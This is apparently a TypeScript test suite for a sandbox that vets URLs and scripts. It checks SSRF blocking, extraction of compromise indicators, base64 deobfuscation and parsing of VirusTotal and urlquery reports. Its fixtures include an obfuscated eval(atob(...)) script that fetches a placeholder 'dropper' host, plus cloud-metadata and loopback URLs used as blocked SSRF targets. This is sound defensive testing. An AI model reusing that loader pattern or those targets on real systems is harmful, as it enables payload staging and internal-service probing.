import { strict as assert } from 'node:assert'
import {
    extractIndicators,
    extractThreatAssociations,
    inspectScript,
    sandboxUrlSafety,
    summarizeDeobfuscationTask,
} from '../src/handlers/onionSession/analysis.ts'
import { parseCymruAsn, parseUrlQueryScores, parseVirusTotalStats, virusTotalUrlResponse, urlQueryTargetMatches, urlQueryReportMatchesTarget, providerStartUrl, providerCommunityComments, providerSummaryText, sandboxResolvedAddressSafety } from '../src/handlers/onionSession/ws.ts'

assert.deepEqual(sandboxUrlSafety('https://example.com/path'), { ok: true })
assert.equal(sandboxUrlSafety('ftp://example.com').ok, false)
assert.equal(sandboxUrlSafety('http://127.0.0.1/admin').ok, false)
assert.equal(sandboxUrlSafety('http://169.254.169.254/latest/meta-data').ok, false)
assert.equal(sandboxUrlSafety('http://metadata.google.internal/computeMetadata/v1').ok, false)
assert.equal(sandboxUrlSafety('http://user:pass@example.com').ok, false)
assert.equal(sandboxUrlSafety('http://[::1]/').ok, false)
assert.equal(sandboxUrlSafety('http://[::ffff:127.0.0.1]/').ok, false)
assert.equal(sandboxUrlSafety('http://[64:ff9b::7f00:1]/').ok, false)
assert.equal(sandboxResolvedAddressSafety([{ address: '10.0.0.8', family: 4 }]).ok, false, 'blocks hostnames resolving to private IPv4')
assert.equal(sandboxResolvedAddressSafety([{ address: '::ffff:7f00:1', family: 6 }]).ok, false, 'blocks hostnames resolving to mapped private IPv6')
assert.equal(sandboxResolvedAddressSafety([]).ok, false, 'fails closed when DNS resolution returns no usable addresses')
assert.deepEqual(sandboxResolvedAddressSafety([{ address: '93.184.216.34', family: 4 }]), { ok: true })

const indicators = extractIndicators('Visit https://stage.example.net/a.js then 203.0.113.44 and bad.example.net.')
assert(indicators.urls.includes('https://stage.example.net/a.js'), 'extracts full URLs for copyable IOC lists')
assert(indicators.ips.includes('203.0.113.44'), 'extracts IPv4 indicators')
assert(indicators.domains.includes('bad.example.net'), 'extracts domain indicators')
assert(!extractIndicators('999.1.1.1').ips.includes('999.1.1.1'), 'rejects impossible IPv4 octets')

const associations = extractThreatAssociations('Tool output: campaign associated with LockBit ransomware and Cobalt Strike beacons.', 'tool_context')
assert(associations.some(item => item.name === 'LockBit' && item.confidence === 'high'), 'extracts high-confidence ransomware context')
assert(associations.some(item => item.name === 'Cobalt Strike'), 'extracts tool context')
assert.equal(extractThreatAssociations('Article title: Vidar (26) woke up with a new name.', 'tool_context').length, 0, 'ignores bare provider-page name mentions')

const encoded = Buffer.from('fetch("https://payload.example.com/dropper"); document.write("stage");').toString('base64')
const script = inspectScript({ src: '', inline: `eval(atob("${encoded}"));` }, 0)
const task = summarizeDeobfuscationTask(script)
assert.match(script.sha256, /^[a-f0-9]{64}$/, 'records a script SHA-256 for analyst evidence')
assert.equal(task.sha256, script.sha256, 'carries script SHA-256 into WebCrack/deobfuscation evidence')
assert.equal(task.assessment, 'suspicious')
assert(task.decodedTransforms.includes('base64 string'), 'records base64 decoding')
assert(task.indicators.domains.includes('payload.example.com'), 'decoded indicators include second-stage domain')
assert(task.summary.includes('decoded network indicators'), 'summarizes why decoded script is suspicious')
assert.equal(parseCymruAsn([['15169 | 8.8.8.0/24 | US | arin | 2023-12-28']]), '15169', 'parses Team Cymru ASN TXT rows')

const providerSummary = providerSummaryText(JSON.stringify({ last_analysis_stats: { malicious: 2, suspicious: 1, harmless: 80, undetected: 12, timeout: 0 } }) + '<td>0 - 1 - 2</td>')
assert(providerSummary.includes('3/95 security vendors'), 'summarizes VirusTotal stats before provider text is trimmed')
assert(providerSummary.includes('3 urlquery alerts'), 'summarizes urlquery score rows before provider text is trimmed')
assert.deepEqual(providerCommunityComments(JSON.stringify({ data: [
    { type: 'comment', attributes: { text: 'LockBit credential theft reported.' } },
    { type: 'comment', attributes: { html: '<p>Suspicious redirect chain observed.</p>' } },
] })), ['LockBit credential theft reported.', 'Suspicious redirect chain observed.'], 'extracts and cleans structured provider comment bodies')

console.log('Browser sandbox analysis helpers passed.')

assert.equal(providerStartUrl({ id: 'urlquery' }, 'https://urlquery.net/search?q=x', 'https://example.com/'), 'https://urlquery.net/search?q=https%3A%2F%2Fexample.com%2F', 'urlquery must open its public search UI, not a 204 HTML fragment')
assert.equal(parseUrlQueryScores('Search: 0 hits'), null, 'missing reports are not a clean verdict')
assert.equal(parseUrlQueryScores('Search: 5 hits'), null, 'a result count alone is not an alert verdict')
assert.deepEqual(parseUrlQueryScores('<td>0 - 0 - 0</td>'), { alerts: 0 })

const report = 'Report Overview Visited public 2026-09-15 07:19:14 URL vg.no Finishing URL www.vg.no/ IP / ASN 3.174.2.5 Title VG Detections urlquery 0 Network Intrusion Detection 0 Threat Detection Systems 0 Host Summary Related reports UQ 8 IDS 1 TDS 2'
assert.deepEqual(parseUrlQueryScores(report), { alerts: 0 }, 'reads current report format, excluding related report counts')
assert.deepEqual(parseUrlQueryScores(report.replace('urlquery 0 Network', 'urlquery 3 Network') + ' No alerts detected'), { alerts: 3 }, 'a clean subsection cannot override detections')
assert.equal(urlQueryReportMatchesTarget(report, 'https://vg.no/'), true)
assert.equal(urlQueryReportMatchesTarget(report, 'https://vg.no/news'), false)
assert.equal(urlQueryReportMatchesTarget(report.replace('URL vg.no Finishing', 'URL evil.test Finishing'), 'https://vg.no/'), false, 'contacted domains are not the report target')
assert.equal(urlQueryTargetMatches('notvg.no', 'https://vg.no/'), false)
assert.equal(urlQueryTargetMatches('https://vg.no.evil.test', 'https://vg.no/'), false)
assert.equal(urlQueryTargetMatches('www.vg.no/', 'https://vg.no/'), true)
assert.equal(urlQueryTargetMatches('vg.no/?a=1', 'https://vg.no/'), false)
assert.equal(urlQueryTargetMatches('http://vg.no/', 'https://vg.no/'), false)
assert.equal(urlQueryTargetMatches('https://', 'https://vg.no/'), false)
assert.equal(parseVirusTotalStats('0/0 security vendors'), null)
assert.equal(parseVirusTotalStats('95/90 security vendors'), null)
assert.equal(parseVirusTotalStats('clean undetected'), null)
const vtResponse = { data: { type: 'url', attributes: { url: 'https://vg.no/', padding: 'x'.repeat(90_000), last_analysis_stats: { malicious: 2, suspicious: 1, harmless: 80, undetected: 12, timeout: 0 }, last_analysis_date: 1_789_000_000 } } }
assert.match(virusTotalUrlResponse(JSON.stringify(vtResponse), 'https://vg.no'), /3\/95 security vendors/)
assert.match(virusTotalUrlResponse(JSON.stringify(vtResponse), 'https://vg.no'), /Existing VirusTotal analysis:/)
assert.equal(virusTotalUrlResponse(JSON.stringify(vtResponse), 'https://vg.no/news'), '')
assert.equal(virusTotalUrlResponse(JSON.stringify({ data: { ...vtResponse.data, type: 'ip_address' } }), 'https://vg.no/'), '')
assert.equal(virusTotalUrlResponse(JSON.stringify({ data: { ...vtResponse.data, type: 'domain' } }), 'https://vg.no/'), '')
assert.equal(virusTotalUrlResponse('{"error":{"code":"NotFoundError"}}', 'https://vg.no/'), '')
console.log('Provider target attribution and current urlquery format passed.')
